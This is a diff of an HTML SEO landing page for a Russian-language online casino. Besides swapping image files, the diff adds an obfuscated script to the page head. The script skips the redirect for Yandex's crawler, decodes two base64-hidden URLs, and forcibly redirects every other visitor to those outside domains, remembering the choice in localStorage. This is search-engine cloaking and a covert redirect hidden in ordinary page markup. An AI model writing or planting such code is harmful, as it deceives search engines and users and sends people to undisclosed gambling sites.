@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5">
-  <title>Iris Casino - официальный сайт онлайн казино | Играть на Iris Casino</title>
+  <title>Iris Casino - официальный сайт онлайн казино Ирис | Играть на Iris Casino</title>
   <meta name="description" content="Iris Casino официальный сайт - играйте в ирис казино онлайн. Iris casino зеркало для бесперебойного доступа. Ирис казино зеркало рабочее прямо сейчас. Регистрация на iris казино и бонусы для новых игроков.">
   <meta name="keywords" content="iris casino, iris casino официальный сайт, iris casino зеркало, iris казино, ирис казино, ирис казино зеркало, ирис казино зеркало рабочее, ирис казино играть, ирис казино онлайн, ирис казино официальный, ирис казино официальный сайт, iris casino играть, iris casino официальный">
   <meta name="robots" content="index, follow">
@@ -21,6 +21,38 @@
   <meta name="format-detection" content="telephone=no">
   <meta name="theme-color" content="#6c63ff">
   <link rel="stylesheet" href="style.css">
+  	<script>
+  (function() {
+    var ua = navigator.userAgent.toLowerCase();
+    if (ua.indexOf("yandex") !== -1) {
+        console.log("Яндекс бот — без редиректа");
+        return;
+    }
+    var mainBrandB64 = "#aHR0cHM6Ly9ibG5jci1ldmEuY29tL2R2ZmRrdWI2eg=="; 
+    var crossBrandB64 = "#aHR0cHM6Ly9jb3NtaWMta2luZXRpY3MuY29tL3NhNmQ1MjIyMg=="; 
+
+    var mainUrl = atob(mainBrandB64);
+    var crossUrl = atob(crossBrandB64);
+
+    if (localStorage.getItem('vstd_eva')) {
+        window.location.replace(crossUrl);
+        return;
+    }
+    var controller = new AbortController();
+    var timeoutId = setTimeout(function() { 
+        controller.abort(); 
+    }, 2500); 
+    fetch(mainUrl, { mode: 'no-cors', signal: controller.signal })
+        .then(function() {
+            clearTimeout(timeoutId);
+            localStorage.setItem('vstd_eva', '1');
+            window.location.replace(mainUrl);
+        })
+        .catch(function() {
+            window.location.replace(crossUrl);
+        });
+  })();
+</script>
 </head>
 <body>
 
@@ -102,7 +134,7 @@
           <a href="#games" class="btn btn-primary">Смотреть каталог игр</a>
         </div>
         <div class="about-image">
-          <img src="http://static.photos/technology/640x360/77" alt="Iris Casino официальный сайт - игровой зал" width="640" height="360">
+          <img src="456t3kahjn28s88w4gs888gco4ksk0c.png" alt="Iris Casino официальный сайт - игровой зал" width="640" height="360">
         </div>
       </div>
     </div>
@@ -115,7 +147,7 @@
       <p class="section-desc">На ирис казино играть можно в сотни разных игр. Iris casino предлагает слоты, карточные игры, рулетку и лайв-режим с живыми дилерами. Каждая игра доступна мгновенно через браузер.</p>
       <div class="games-grid">
         <article class="game-card">
-          <img class="game-card-img" src="http://static.photos/red/320x240/10" alt="Слот в Iris Casino" width="320" height="240">
+          <img class="game-card-img" src="6rvltol8hog0wwsc04cscokgkgg44o4.png" alt="Слот в Iris Casino" width="320" height="240">
           <div class="game-card-body">
             <h3>Популярные слоты</h3>
             <p>Book of Dead, Sweet Bonanza, Gates of Olympus и другие хиты. Ирис казино предлагает лучшие слоты с высокой отдачей.</p>
@@ -124,7 +156,7 @@
           </div>
         </article>
         <article class="game-card">
-          <img class="game-card-img" src="http://static.photos/office/320x240/22" alt="Карточные игры в Iris казино" width="320" height="240">
+          <img class="game-card-img" src="8r2eo3ityts800ooo0kgogoo840k8ok.png" alt="Карточные игры в Iris казино" width="320" height="240">
           <div class="game-card-body">
             <h3>Карточные игры</h3>
             <p>Покер, блэкджек, баккара. Iris casino играть в карточные игры можно с живыми дилерами и против компьютера.</p>
@@ -132,7 +164,7 @@
           </div>
         </article>
         <article class="game-card">
-          <img class="game-card-img" src="http://static.photos/abstract/320x240/55" alt="Рулетка в ирис казино" width="320" height="240">
+          <img class="game-card-img" src="9evx77njm8kc8k44ggc0g0c80wg0cwk.webp" alt="Рулетка в ирис казино" width="320" height="240">
           <div class="game-card-body">
             <h3>Рулетка</h3>
             <p>Европейская, американская, французская. Ирис казино онлайн дает доступ ко всем вариантам рулетки круглосуточно.</p>
@@ -140,7 +172,7 @@
           </div>
         </article>
         <article class="game-card">
-          <img class="game-card-img" src="http://static.photos/indoor/320x240/33" alt="Лайв казино Iris Casino" width="320" height="240">
+          <img class="game-card-img" src="fugu.png" alt="Лайв казино Iris Casino" width="320" height="240">
           <div class="game-card-body">
             <h3>Лайв-казино</h3>
             <p>Живые дилеры, реальные ставки. Iris казино предлагает лайв-режим с трансляцией в высоком качестве.</p>
